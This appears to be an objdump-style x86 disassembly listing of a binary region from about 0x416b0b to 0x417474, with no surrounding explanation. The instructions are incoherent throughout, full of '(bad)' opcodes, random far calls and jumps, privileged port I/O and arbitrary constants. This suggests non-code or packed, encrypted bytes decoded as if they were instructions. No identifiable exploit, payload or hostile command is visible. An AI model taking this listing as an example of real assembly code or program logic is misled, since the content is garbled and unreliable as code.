  416b0b:	fs jnp 0x416b06
  416b0e:	dec    ecx
  416b0f:	stc    
  416b10:	ins    DWORD PTR es:[edi],dx
  416b11:	ins    DWORD PTR es:[edi],dx
  416b12:	cmp    BYTE PTR [edi+0x47],dh
  416b15:	cmp    DWORD PTR [edi+edi*1-0x3b956529],ebx
  416b1c:	or     ah,BYTE PTR [ebp+0x3]
  416b1f:	cmp    eax,0x6033f830
  416b24:	push   edi
  416b25:	lds    eax,FWORD PTR [ebp+0x7d05aabe]
  416b2b:	arpl   WORD PTR ss:[eax+0x4829b8bc],dx
  416b32:	mul    BYTE PTR [ebx+0xf]
  416b35:	mov    eax,0xb9a4806e
  416b3a:	sahf   
  416b3b:	sub    al,0x94
  416b3d:	and    BYTE PTR [ebx+0xc4eaa31],dl
  416b43:	int3   
  416b44:	mov    ecx,0xc1dfad51
  416b49:	cmp    esp,DWORD PTR [edi+0x7f]
  416b4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b4d:	xor    al,0x88
  416b4f:	jo     0x416b5f
  416b51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b52:	or     esp,DWORD PTR [ebp-0x2a2577ee]
  416b58:	cli    
  416b59:	push   ebp
  416b5a:	jns    0x416b8b
  416b5c:	stos   BYTE PTR es:[edi],al
  416b5d:	inc    ebx
  416b5e:	out    0x3f,eax
  416b60:	imul   DWORD PTR [esp+eiz*4+0x679fc6f8]
  416b67:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b69:	call   0xa0268682
  416b6e:	or     eax,0xb1aac29e
  416b73:	add    al,0x38
  416b75:	or     ah,ch
  416b77:	add    eax,0x5984df0d
  416b7c:	fnsave [eax+0x2d]
  416b7f:	mov    DWORD PTR [edi],ebx
  416b81:	lahf   
  416b82:	xor    cl,BYTE PTR [eax+0x5ed16d87]
  416b88:	cdq    
  416b89:	or     ah,BYTE PTR [ebp+0x48]
  416b8c:	push   esi
  416b8d:	and    cl,0xd8
  416b90:	fstp   QWORD PTR [ecx]
  416b92:	jg     0x416bac
  416b94:	hlt    
  416b95:	je     0x416bee
  416b97:	pop    ebp
  416b98:	cmp    dh,ah
  416b9a:	in     al,dx
  416b9b:	jmp    DWORD PTR [ecx]
  416b9d:	fiadd  WORD PTR [eax+0x77176128]
  416ba3:	mov    esi,0x9389beb
  416ba8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ba9:	int3   
  416baa:	mov    ebx,0xcea03958
  416baf:	dec    ecx
  416bb0:	push   cs
  416bb1:	paddusw mm6,QWORD PTR [eax]
  416bb4:	iret   
  416bb5:	popa   
  416bb6:	sti    
  416bb7:	inc    ecx
  416bb8:	mov    ds:0x3022de4a,eax
  416bbd:	push   ebx
  416bbe:	mov    esi,DWORD PTR [edx+0x7c]
  416bc1:	test   BYTE PTR [ebp+0x164c2027],ch
  416bc7:	(bad)  
  416bc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bca:	sub    ah,bl
  416bcc:	test   bh,0xa
  416bcf:	mov    ah,0x0
	...
  416d9d:	add    BYTE PTR [eax],al
  416d9f:	add    BYTE PTR [ecx],dh
  416da1:	loopne 0x416d84
  416da3:	mov    ecx,0xe879b9f1
  416da8:	aas    
  416da9:	stos   DWORD PTR es:[edi],eax
  416daa:	in     al,0x3
  416dac:	loopne 0x416dc3
  416dae:	mov    eax,ds:0x1e96bf1
  416db3:	add    BYTE PTR [edx],ah
  416db5:	pop    es
  416db6:	add    BYTE PTR [eax],al
  416db8:	outs   dx,BYTE PTR ds:[esi]
  416db9:	shl    BYTE PTR [edi-0x76],1
  416dbc:	mov    edi,0xf6787d76
  416dc1:	push   ebp
  416dc2:	ret    
  416dc3:	imul   bh
  416dc5:	out    0x60,eax
  416dc7:	xlat   BYTE PTR ds:[ebx]
  416dc8:	ins    BYTE PTR es:[di],dx
  416dca:	repnz mov cl,0xcd
  416dcd:	adc    ah,BYTE PTR [edi+0x1]
  416dd0:	sar    BYTE PTR [esi+0x1801185d],1
  416dd6:	repz popa 
  416dd8:	out    dx,al
  416dd9:	pop    ss
  416dda:	(bad)  
  416ddb:	out    0x6,eax
  416ddd:	popf   
  416dde:	leave  
  416ddf:	sahf   
  416de0:	push   esi
  416de1:	inc    ebp
  416de2:	push   ebx
  416de3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416de4:	aad    0x79
  416de6:	js     0x416d7a
  416de8:	adc    BYTE PTR [ebx-0x5],al
  416deb:	in     al,dx
  416dec:	mov    ds:0xe4897742,eax
  416df1:	pxor   mm1,QWORD PTR ds:0xbaf2e93d
  416df8:	sub    eax,0xd81d1fb6
  416dfd:	fisubr WORD PTR fs:0xd7217eaa
  416e04:	bound  esp,QWORD PTR [ebp+0x5]
  416e07:	aam    0x66
  416e09:	retf   0xddfd
  416e0c:	sub    BYTE PTR [edx],dl
  416e0e:	fisttp WORD PTR [ebx-0x74]
  416e11:	cmp    al,0xf7
  416e13:	sbb    bl,bl
  416e15:	ret    
  416e16:	jecxz  0x416e3b
  416e18:	cdq    
  416e19:	cli    
  416e1a:	call   0x60b4:0xfba5bcef
  416e21:	add    ch,BYTE PTR [ecx+0x51]
  416e24:	cdq    
  416e25:	imul   ebx,DWORD PTR [esi+0x76],0x8b34e483
  416e2c:	jnp    0x416e70
  416e2e:	adc    al,al
  416e30:	jbe    0x416dc1
  416e32:	cmp    eax,0xfbca108f
  416e37:	lock popa 
  416e39:	(bad)  
  416e3a:	and    al,0x9b
  416e3c:	dec    ebx
  416e3d:	data16 (bad) [esi+0x2a8311e3]
  416e44:	pop    ebp
  416e45:	sub    eax,0xc17b0f1d
  416e4a:	sub    ecx,DWORD PTR [edx+0x30]
  416e4d:	jbe    0x416e6c
  416e4f:	shl    DWORD PTR [eax+0x2c],1
  416e52:	xor    eax,0xd84d6d39
  416e57:	xor    esp,esp
  416e59:	mov    bh,0x9d
  416e5b:	in     al,dx
  416e5c:	cmp    BYTE PTR [eax+0x7e2ac7],dh
  416e62:	loope  0x416df3
  416e64:	dec    eax
  416e65:	xor    BYTE PTR [ecx+0x2d99049c],al
  416e6b:	mov    es,WORD PTR ds:0xd665d10e
  416e71:	das    
  416e72:	ds push esp
  416e74:	pop    ds
  416e75:	mov    eax,0xb1c02f15
  416e7a:	sar    al,cl
  416e7c:	scas   al,BYTE PTR es:[edi]
  416e7d:	inc    eax
  416e7e:	inc    esi
  416e7f:	inc    esi
  416e80:	dec    esp
  416e81:	mov    al,0xef
  416e83:	lock xlat BYTE PTR ds:[ebx]
  416e85:	imul   DWORD PTR cs:[edi]
  416e88:	xor    ecx,DWORD PTR [eax-0x6e]
  416e8b:	jmp    0x889258d6
  416e90:	jmp    0x416e33
  416e92:	pop    edx
  416e93:	mov    ebp,0xbf275914
  416e98:	call   0xc5f0d081
  416e9d:	xchg   ecx,eax
  416e9e:	ret    0x263b
  416ea1:	and    ebx,DWORD PTR [ecx]
  416ea3:	jg     0x416f1d
  416ea5:	std    
  416ea6:	mov    esi,0x2a65c23a
  416eab:	add    ebp,esi
  416ead:	mov    WORD PTR [bx+si],ds
  416eb0:	cwde   
  416eb1:	inc    esp
  416eb2:	jno    0x416e57
  416eb4:	cmp    al,0x3e
  416eb6:	mov    cl,0xee
  416eb8:	fcmovb st,st(5)
  416eba:	sbb    al,0xbf
  416ebc:	ret    0x2410
  416ebf:	xchg   WORD PTR [ebx*8+0x72732559],bx
  416ec7:	daa    
  416ec8:	xchg   bh,ah
  416eca:	add    eax,0x50f328e6
  416ecf:	ja     0x416ecd
  416ed1:	add    cl,BYTE PTR [ebx-0x10]
  416ed4:	cmp    ah,BYTE PTR [esi]
  416ed6:	lds    esi,FWORD PTR [ebp+0x2908b894]
  416edc:	jo     0x416f35
  416ede:	push   esp
  416edf:	push   eax
  416ee0:	mov    ah,0xdd
  416ee2:	sub    al,0xd3
  416ee4:	bound  edx,QWORD PTR [ecx+0xa81ed4e]
  416eea:	ficom  WORD PTR [esi+0x2b]
  416eed:	adc    al,0x5c
  416eef:	xchg   DWORD PTR [ebp+edi*1-0x50d5e3cb],ebp
  416ef6:	pop    ebp
  416ef7:	or     al,0x4a
  416ef9:	rcl    DWORD PTR [edx+eiz*1-0x7],1
  416efd:	adc    eax,0xb37d4149
  416f02:	shr    DWORD PTR [esi-0x501ed691],0x56
  416f09:	jb     0x416ecc
  416f0b:	sar    DWORD PTR [edi],1
  416f0d:	add    al,0xf1
  416f0f:	test   eax,0x6e75ac02
  416f14:	dec    ebx
  416f15:	dec    ebp
  416f16:	daa    
  416f17:	nop
  416f18:	add    al,0xd1
  416f1a:	mov    esi,0x3fd6bd20
  416f1f:	pushf  
  416f20:	mov    eax,0x53065a36
  416f25:	sbb    DWORD PTR ds:0x829322bd,edi
  416f2b:	xor    bh,0x9c
  416f2e:	dec    esp
  416f2f:	pop    ebx
  416f30:	retf   
  416f31:	jbe    0x416f0a
  416f33:	and    edi,DWORD PTR [ebp+0x1e]
  416f36:	pop    edx
  416f37:	jmp    0xeda38d98
  416f3c:	jb     0x416f2f
  416f3e:	pusha  
  416f3f:	test   eax,0x4fcc2884
  416f44:	fadd   DWORD PTR [edi]
  416f46:	das    
  416f47:	js     0x416f27
  416f49:	push   ebx
  416f4a:	out    dx,al
  416f4b:	sahf   
  416f4c:	or     DWORD PTR [eax+0x39],0x7b
  416f50:	push   cs
  416f51:	retf   
  416f52:	iret   
  416f53:	jns    0x416f85
  416f55:	jle    0x416ed9
  416f57:	shl    DWORD PTR ds:0xec2561b7,cl
  416f5d:	mov    al,ds:0x319faf6a
  416f62:	fisubr DWORD PTR ds:0x8c25949b
  416f68:	pusha  
  416f69:	push   eax
  416f6a:	push   eax
  416f6b:	jge    0x416fbb
  416f6d:	sbb    bl,bh
  416f6f:	push   esi
  416f70:	iret   
  416f71:	fidiv  DWORD PTR [ebx-0x6312730c]
  416f77:	cmp    BYTE PTR [ecx],ah
  416f79:	ds repz push es
  416f7c:	inc    eax
  416f7d:	cmp    BYTE PTR [ebx-0x4dfb5ec7],bl
  416f83:	(bad)  
  416f84:	imul   esi,DWORD PTR [eax+0x2859b0c1],0xbbe2ebec
  416f8e:	jns    0x416fb3
  416f90:	ret    0x4079
  416f93:	cdq    
  416f94:	lock xchg ah,dh
  416f97:	mov    bh,0x10
  416f99:	cmp    BYTE PTR [ecx],dh
  416f9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f9c:	sub    esi,0xc3b24181
  416fa2:	sub    ebp,edx
  416fa4:	fisttp WORD PTR [ebp-0x6a879358]
  416faa:	mov    al,ds:0x1990deb9
  416faf:	add    al,0x98
  416fb1:	lods   al,BYTE PTR ds:[esi]
  416fb2:	je     0x416f73
  416fb4:	jle    0x416f8f
  416fb6:	jg     0x416f7b
  416fb8:	and    BYTE PTR [eax-0x45],dl
  416fbb:	in     eax,0x7
  416fbd:	loop   0x416fee
  416fbf:	sbb    ebp,DWORD PTR [ebx+0x2a]
  416fc2:	shl    BYTE PTR [ebx-0x47d4f421],0x5
  416fc9:	jecxz  0x416fb8
  416fcb:	jbe    0x416f6e
  416fcd:	sub    esi,DWORD PTR [ecx-0xcee7fa4]
  416fd3:	xchg   edi,eax
  416fd4:	sub    eax,0x820df1f2
  416fd9:	repnz aaa 
  416fdb:	das    
  416fdc:	pcmpgtb mm3,mm6
  416fdf:	cmp    BYTE PTR [ecx],cl
  416fe1:	pop    ss
  416fe2:	clc    
  416fe3:	add    al,0x64
  416fe5:	push   cs
  416fe6:	push   edi
  416fe7:	das    
  416fe8:	imul   BYTE PTR [eax-0x2b172c8a]
  416fee:	(bad)  
  416ff0:	jp     0x417062
  416ff2:	rcl    ch,cl
  416ff4:	xor    edi,DWORD PTR [ebp+0x9]
  416ff7:	xchg   edi,eax
  416ff8:	test   al,0x1e
  416ffa:	imul   edx,esi,0x590ea1d3
  417000:	lock fidiv WORD PTR [ebp+0x1abf5139]
  417007:	aam    0xd0
  417009:	outs   dx,DWORD PTR ds:[esi]
  41700a:	lock adc dh,BYTE PTR [ebx+0x71e84d37]
  417011:	jmp    DWORD PTR [eax+0x7f]
  417014:	cmp    al,0xb
  417016:	test   esp,0x2b88c06f
  41701c:	inc    ecx
  41701d:	dec    ecx
  41701e:	cmp    al,0x47
  417020:	jge    0x416fa8
  417022:	sti    
  417023:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417024:	aad    0xf9
  417026:	pop    edx
  417027:	jne    0x417034
  417029:	aaa    
  41702a:	fist   WORD PTR [eax+0x27de3bf]
  417030:	out    0x79,al
  417032:	call   0xf39c:0xac0e1670
  417039:	jo     0x416fef
  41703b:	adc    ch,BYTE PTR [edx]
  41703d:	push   ebp
  41703e:	lds    ecx,FWORD PTR [ebx]
  417040:	sar    BYTE PTR [eax+0x63],1
  417043:	xchg   edi,ebx
  417045:	or     edx,DWORD PTR [esi]
  417047:	sahf   
  417048:	inc    edx
  417049:	push   edx
  41704a:	inc    eax
  41704b:	sahf   
  41704c:	or     DWORD PTR [esi-0x296a566b],0x93cf4bec
  417056:	nop
  417057:	ja     0x4170ce
  417059:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41705a:	div    BYTE PTR [ecx]
  41705c:	push   cs
  41705d:	test   DWORD PTR [esi],edx
  41705f:	jne    0x417092
  417061:	push   ds
  417062:	pop    ss
  417063:	bound  esp,QWORD PTR [ebx+0x21a8e515]
  417069:	stos   DWORD PTR es:[edi],eax
  41706a:	(bad)  
  41706b:	dec    ebp
  41706c:	(bad)  
  41706d:	lea    edi,[esi+0x73]
  417070:	inc    esp
  417071:	stos   BYTE PTR es:[edi],al
  417072:	mov    WORD PTR ds:[ebp+0x7d],ds
  417076:	imul   ebp,DWORD PTR [ecx+eax*2],0x76
  41707a:	data16 icebp 
  41707c:	retf   
  41707d:	xor    ecx,DWORD PTR [edx-0x5e]
  417080:	xchg   esp,eax
  417081:	dec    ebx
  417082:	adc    BYTE PTR [ecx-0xa1a80d1],dh
  417088:	mov    fs,WORD PTR [esp+ecx*4+0x668749a6]
  41708f:	inc    esi
  417090:	mov    cl,0x11
  417092:	sbb    eax,0x492d2b25
  417097:	push   es
  417098:	inc    eax
  417099:	stos   DWORD PTR es:[edi],eax
  41709a:	mov    ebx,0xb38181d8
  41709f:	push   esp
  4170a0:	sub    ebp,edi
  4170a2:	sbb    BYTE PTR [edx+0x32066b2e],dh
  4170a8:	mov    BYTE PTR [ebx-0x14],bl
  4170ab:	cmp    DWORD PTR [eax],esi
  4170ad:	or     edi,DWORD PTR [edx-0x20]
  4170b0:	inc    ecx
  4170b1:	add    ebx,DWORD PTR [ebp+0x72eefc9]
  4170b7:	cdq    
  4170b8:	in     al,0xc
  4170ba:	in     eax,dx
  4170bb:	call   0x7e34cc72
  4170c0:	gs in  al,0xe9
  4170c3:	xchg   esp,eax
  4170c4:	dec    ecx
  4170c5:	inc    esp
  4170c6:	out    dx,al
  4170c7:	retf   0x7f09
  4170ca:	xor    DWORD PTR [ecx-0x4882f3ee],esi
  4170d0:	clc    
  4170d1:	jp     0x4170cd
  4170d3:	adc    eax,0x6b4184e7
  4170d8:	bound  ebp,QWORD PTR [bx+di]
  4170db:	cli    
  4170dc:	push   ecx
  4170dd:	pop    ebp
  4170de:	arpl   WORD PTR [edx],dx
  4170e0:	arpl   WORD PTR [edi+0x205c5b2b],bp
  4170e6:	js     0x4170bf
  4170e8:	leave  
  4170e9:	sub    al,0xcf
  4170eb:	mov    ch,0x75
  4170ed:	js     0x4170d1
  4170ef:	adc    cl,BYTE PTR [edx+ebx*1-0x5c]
  4170f3:	outs   dx,BYTE PTR ds:[esi]
  4170f4:	xlat   BYTE PTR ds:[ebx]
  4170f5:	pop    ebx
  4170f6:	push   cs
  4170f7:	sub    al,0xba
  4170f9:	pop    ecx
  4170fa:	add    dh,BYTE PTR [ecx]
  4170fc:	add    DWORD PTR [ecx+0x57a079ad],esp
  417102:	and    ecx,DWORD PTR [esi-0x57a38663]
  417108:	pop    ebp
  417109:	in     eax,0x9
  41710b:	neg    dh
  41710d:	popf   
  41710e:	or     bh,BYTE PTR [ebx-0x5076d197]
  417114:	adc    al,0x32
  417116:	add    BYTE PTR [edx],0xcb
  417119:	inc    esi
  41711a:	test   BYTE PTR [ebp+eiz*2+0x4c],0x30
  41711f:	mov    DWORD PTR [esi],edx
  417121:	daa    
  417122:	sub    eax,0x78cf3ec2
  417127:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417128:	icebp  
  417129:	mov    edi,0x8d6d1d36
  41712e:	loopne 0x4171ae
  417130:	jno    0x41710d
  417132:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417133:	xchg   esp,eax
  417134:	xor    esp,DWORD PTR [ecx-0x4cc3f63e]
  41713a:	mov    ch,0x32
  41713c:	(bad)
  417140:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417141:	inc    esp
  417142:	cs pop ds
  417144:	sub    bh,BYTE PTR [eax+ebx*2+0x17]
  417148:	sub    eax,0x503e7b00
  41714d:	mov    ds:0x65e1f4cb,eax
  417152:	repz aam 0x76
  417155:	cmp    cl,cl
  417157:	ret    0xd48c
  41715a:	mov    DWORD PTR [ebx+0x336ccd28],ecx
  417160:	mov    ebp,0x2e41cf94
  417165:	and    DWORD PTR [ecx-0x30a34109],eax
  41716b:	fnstcw WORD PTR [ebx]
  41716d:	xlat   BYTE PTR ds:[ebx]
  41716e:	push   edx
  41716f:	nop
  417170:	inc    edx
  417171:	lods   eax,DWORD PTR ds:[esi]
  417172:	xchg   ebx,eax
  417173:	ds xchg ecx,eax
  417175:	(bad)  
  417176:	sbb    cl,ch
  417178:	aam    0x5e
  41717a:	out    0xd8,eax
  41717c:	mov    edx,0x516f4320
  417181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417182:	nop
  417183:	sbb    esi,DWORD PTR [esi+ebp*8-0x31]
  417187:	or     eax,0xb768950f
  41718c:	push   edi
  41718d:	je     0x41720b
  41718f:	jle    0x417138
  417191:	fdivr  QWORD PTR [eax-0x3]
  417194:	cmp    BYTE PTR [ecx+0xa],0x59
  417198:	out    0x8a,eax
  41719a:	pop    edx
  41719b:	inc    ebp
  41719c:	jmp    0x417199
  41719e:	dec    edi
  41719f:	scas   al,BYTE PTR es:[edi]
  4171a0:	push   ebp
  4171a1:	mov    bh,0x92
  4171a3:	mov    eax,0x2316af49
  4171a8:	and    eax,ebp
  4171aa:	xchg   ebx,eax
  4171ab:	fadd   QWORD PTR [edx]
  4171ad:	jb     0x4171d1
  4171af:	xor    DWORD PTR [edi-0x70],esp
  4171b2:	xchg   DWORD PTR ds:[eax+0x13],ecx
  4171b6:	das    
  4171b7:	xchg   ecx,eax
  4171b8:	push   esp
  4171b9:	sub    DWORD PTR ds:0x83dd1882,ebx
  4171bf:	lock (bad) 
  4171c1:	sub    al,BYTE PTR [esp+esi*4]
  4171c4:	or     eax,0x57fa0257
  4171c9:	and    BYTE PTR [edi+ecx*2-0x32c05ca8],dh
  4171d0:	aas    
  4171d1:	dec    esp
  4171d2:	addr16 (bad) 
  4171d4:	push   ebx
  4171d5:	aam    0x2d
  4171d7:	iret   
  4171d8:	std    
  4171d9:	xchg   ebp,eax
  4171da:	int    0xcd
  4171dc:	sub    cl,bh
  4171de:	faddp  st(2),st
  4171e0:	adc    DWORD PTR [edx+0x58],edx
  4171e3:	nop
  4171e4:	in     eax,0x35
  4171e6:	push   0xb1dc5d44
  4171eb:	sub    bl,bh
  4171ed:	mov    al,BYTE PTR [ebp+0x4fb6ac58]
  4171f3:	retf   0xc7f0
  4171f6:	pop    ebx
  4171f7:	hlt    
  4171f8:	jbe    0x41722e
  4171fa:	mov    dh,0x27
  4171fc:	aaa    
  4171fd:	dec    eax
  4171fe:	js     0x417279
  417200:	(bad)  
  417201:	(bad)  
  417203:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417204:	add    edi,DWORD PTR ds:0x36e64bc3
  41720a:	sbb    eax,0x21ea595f
  41720f:	fucom  st(1)
  417211:	popa   
  417212:	adc    eax,0x5e2dae76
  417217:	das    
  417218:	cmp    eax,0x8e177588
  41721d:	adc    edi,DWORD PTR [edi-0x4e824aba]
  417223:	adc    eax,0xb280f534
  417228:	sub    eax,0x589a444f
  41722d:	mov    cl,0x5d
  41722f:	es mov al,0xe7
  417232:	fild   DWORD PTR [ebx-0x471b3e73]
  417238:	aaa    
  417239:	call   0xf5df6e6d
  41723e:	out    0x9a,al
  417240:	icebp  
  417241:	repz jns 0x417280
  417244:	retf   
  417245:	imul   edx,DWORD PTR [ecx+0x4f],0xffffffce
  417249:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41724a:	rol    DWORD PTR [ebx+0x40],cl
  41724d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41724e:	dec    ebp
  41724f:	mov    dh,0x40
  417251:	inc    edx
  417252:	arpl   WORD PTR [ebx+0x31],ax
  417255:	sub    DWORD PTR [ebx],ecx
  417257:	xchg   edx,eax
  417258:	jns    0x41726c
  41725a:	call   0x3fa0b2bb
  41725f:	dec    ebx
  417260:	inc    edx
  417261:	mov    ebp,0xa8c61491
  417266:	sbb    BYTE PTR [edx-0x38],dl
  417269:	test   eax,0xf63fd3cf
  41726e:	or     al,BYTE PTR [esi-0x5d]
  417271:	cld    
  417272:	ja     0x417290
  417274:	jge    0x41722e
  417276:	sbb    al,0x73
  417278:	inc    edi
  417279:	push   ds
  41727a:	xchg   ecx,eax
  41727b:	(bad)  
  41727c:	sub    dl,bl
  41727e:	out    0xdf,eax
  417280:	lea    eax,[esi-0x52]
  417283:	jmp    0x10edb209
  417288:	push   ecx
  417289:	popa   
  41728a:	push   edi
  41728b:	data16 repnz cli 
  41728e:	out    0x69,eax
  417290:	sahf   
  417291:	cld    
  417292:	mov    DWORD PTR [esi],esp
  417294:	jg     0x4172bf
  417296:	jle    0x41724d
  417298:	xlat   BYTE PTR ss:[ebx]
  41729a:	fs std 
  41729c:	rcl    DWORD PTR [ebx+esi*4+0x3],cl
  4172a0:	push   ds
  4172a1:	push   es
  4172a2:	push   ds
  4172a3:	aas    
  4172a4:	jo     0x4172ac
  4172a6:	sub    ebp,DWORD PTR [edi]
  4172a8:	pop    ds
  4172a9:	js     0x41722b
  4172ab:	pop    ebp
  4172ac:	pop    edx
  4172ad:	js     0x41723f
  4172af:	pop    ebp
  4172b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172b1:	ficom  WORD PTR [ebx+0x2]
  4172b4:	scas   al,BYTE PTR es:[edi]
  4172b5:	das    
  4172b6:	mov    ds:0xf63ef264,al
  4172bb:	js     0x4172cd
  4172bd:	(bad)  
  4172be:	js     0x417319
  4172c0:	mov    dl,0xf4
  4172c2:	inc    edx
  4172c3:	fwait
  4172c4:	adc    BYTE PTR [eax],bl
  4172c6:	nop
  4172c7:	mov    eax,ds:0xbabe5cdb
  4172cc:	dec    ebx
  4172cd:	mov    ds:0x369e31da,al
  4172d2:	pop    ecx
  4172d3:	(bad)  
  4172d4:	push   edi
  4172d5:	mul    DWORD PTR [ebx-0x29aa0ca4]
  4172db:	pop    esi
  4172dc:	test   al,0xa7
  4172de:	test   DWORD PTR [eax+ebx*1+0x4e],eax
  4172e2:	jmp    0x3d609197
  4172e7:	cmp    BYTE PTR [edx-0x2212ee06],bl
  4172ed:	popa   
  4172ee:	xor    bh,0xfe
  4172f1:	lods   al,BYTE PTR ds:[esi]
  4172f2:	adc    edx,DWORD PTR [ebp+0x52]
  4172f5:	cmp    BYTE PTR [esi],al
  4172f7:	push   edi
  4172f8:	lds    ebp,FWORD PTR [ebx+0x31]
  4172fb:	addr16 push esp
  4172fd:	aad    0xc2
  4172ff:	adc    al,0x4e
  417301:	mov    cl,0x7b
  417303:	add    DWORD PTR [edi-0x1f],ebp
  417306:	add    eax,0xb90375c3
  41730b:	mov    bl,ch
  41730d:	inc    esi
  41730e:	inc    esp
  41730f:	xor    al,dl
  417311:	fadd   DWORD PTR [ebx-0x73f58766]
  417317:	cdq    
  417318:	leave  
  417319:	cs sub eax,0x6cc55270
  41731f:	mov    eax,ds:0xd26067a
  417324:	outs   dx,DWORD PTR ds:[esi]
  417325:	fdivr  DWORD PTR [esp+edi*4-0x7ae90a09]
  41732c:	pop    edi
  41732d:	mov    bl,0x7
  41732f:	cmp    al,0x95
  417331:	push   ebp
  417332:	xor    DWORD PTR [ebx],ebx
  417334:	inc    esp
  417335:	icebp  
  417336:	clc    
  417337:	jle    0x4173ac
  417339:	mov    cl,0x22
  41733b:	(bad)  
  41733c:	and    BYTE PTR [edi],al
  41733e:	inc    edi
  41733f:	vpunpckldq ymm1,ymm3,ymm4
  417343:	push   esi
  417344:	cwde   
  417345:	push   ss
  417346:	jo     0x4172ea
  417348:	daa    
  417349:	or     edx,DWORD PTR cs:[ebx]
  41734c:	loope  0x41732d
  41734e:	push   es
  41734f:	and    al,0xdd
  417351:	(bad)  
  417352:	mov    dl,0x0
  417354:	lock inc esi
  417356:	adc    esi,esi
  417358:	test   eax,0x6c761fb7
  41735d:	(bad)  
  41735e:	jo     0x41739b
  417360:	or     DWORD PTR [edi+0x59],0x30
  417364:	ja     0x41731a
  417366:	push   ds
  417367:	sbb    eax,0xade8f39c
  41736c:	xor    al,0xe5
  41736e:	inc    ebx
  41736f:	or     ebx,DWORD PTR [edx-0x35fe2dd1]
  417375:	xlat   BYTE PTR ds:[ebx]
  417376:	out    dx,eax
  417377:	out    0x37,eax
  417379:	aam    0x7c
  41737b:	loop   0x417359
  41737d:	je     0x4173f0
  41737f:	sar    BYTE PTR [eax-0x2f5038c1],cl
  417385:	cs mov edx,0xfcb56b9b
  41738b:	iret   
  41738c:	inc    BYTE PTR ds:0xc86a2090
  417392:	pop    eax
  417393:	sbb    BYTE PTR [ebx+0x32],0xdf
  417397:	mov    bh,0x77
  417399:	mov    dl,0x31
  41739b:	sub    al,0x3f
  41739d:	sbb    al,0x4c
  41739f:	popa   
  4173a0:	adc    eax,0x1bfa0886
  4173a5:	shr    BYTE PTR [eax],cl
  4173a7:	jns    0x417338
  4173a9:	ins    BYTE PTR es:[edi],dx
  4173aa:	ins    BYTE PTR es:[edi],dx
  4173ab:	sub    eax,0xa3724b76
  4173b0:	cmp    bh,bh
  4173b2:	nop
  4173b3:	iret   
  4173b4:	adc    edx,edi
  4173b6:	fmul   QWORD PTR [ecx]
  4173b8:	xchg   edi,eax
  4173b9:	test   DWORD PTR [ebp+0x57],esp
  4173bc:	outs   dx,BYTE PTR ds:[esi]
  4173bd:	cmovge esp,DWORD PTR [ecx-0xdacc5ec]
  4173c4:	adc    ebp,DWORD PTR [esi]
  4173c6:	repz iret 
  4173c8:	test   al,0xba
  4173cb:	inc    esp
  4173cc:	ret    
  4173cd:	daa    
  4173ce:	ror    dh,0xdc
  4173d1:	mov    edi,0x6bea3b5
  4173d6:	popa   
  4173d7:	in     eax,dx
  4173d8:	dec    esp
  4173d9:	icebp  
  4173da:	nop
  4173db:	adc    ecx,eax
  4173dd:	in     al,0x1f
  4173df:	mov    cl,0xbd
  4173e1:	push   ecx
  4173e2:	(bad)  
  4173e3:	fld    QWORD PTR [ecx-0x74]
  4173e6:	shl    BYTE PTR [ebp-0x2],0x46
  4173ea:	xor    eax,0x191c31cf
  4173ef:	loope  0x41739e
  4173f1:	shr    DWORD PTR [esi+0x77],1
  4173f4:	dec    eax
  4173f5:	pushf  
  4173f6:	in     al,dx
  4173f7:	cdq    
  4173f8:	mov    dl,0xfa
  4173fa:	(bad)
  4173fe:	jnp    0x41738f
  417400:	cmp    edi,DWORD PTR [esp+esi*4-0x2a]
  417404:	xlat   BYTE PTR ds:[ebx]
  417405:	(bad)  
  417406:	je     0x4173aa
  417408:	aad    0x69
  41740a:	xchg   edi,eax
  41740b:	adc    BYTE PTR [edx],0x19
  41740e:	jns    0x417423
  417410:	mov    ch,BYTE PTR [ebx+ebx*2-0x1c]
  417414:	call   0xa44c:0x7671a770
  41741b:	aam    0xde
  41741d:	imul   edi,ecx,0x48
  417420:	pop    ss
  417421:	into   
  417422:	jge    0x417441
  417424:	lahf   
  417425:	cdq    
  417426:	cvtps2pd xmm0,QWORD PTR [eax]
  417429:	outs   dx,BYTE PTR ds:[esi]
  41742a:	aas    
  41742b:	in     eax,dx
  41742c:	fistp  QWORD PTR [ebp-0x5bcf6130]
  417432:	mov    eax,0x648929f5
  417437:	mov    esp,0x78c80d7a
  41743c:	mov    cl,0x75
  41743e:	fs jae 0x417458
  417441:	in     eax,dx
  417442:	ret    0xf6ef
  417445:	push   edx
  417446:	mov    edx,0xfb85d150
  41744b:	push   edx
  41744c:	lods   ax,WORD PTR ds:[esi]
  41744e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41744f:	xor    DWORD PTR [esi],eax
  417451:	mov    ah,0x0
  417453:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417454:	in     al,dx
  417455:	popf   
  417456:	jl     0x417408
  417458:	sbb    ebp,DWORD PTR [eax]
  41745a:	dec    edi
  41745b:	pop    ecx
  41745c:	sar    BYTE PTR [edi-0x64],1
  41745f:	mov    BYTE PTR [ebx-0x34],cl
  417462:	popf   
  417463:	jo     0x417411
  417465:	jl     0x4174e1
  417467:	and    eax,DWORD PTR [edi]
  417469:	fild   DWORD PTR [edx]
  41746b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41746c:	inc    ebx
  41746d:	or     ah,BYTE PTR [esi-0x5a]
  417470:	fmulp  st(5),st
  417472:	add    cl,cl
  417474:	out    dx,eax
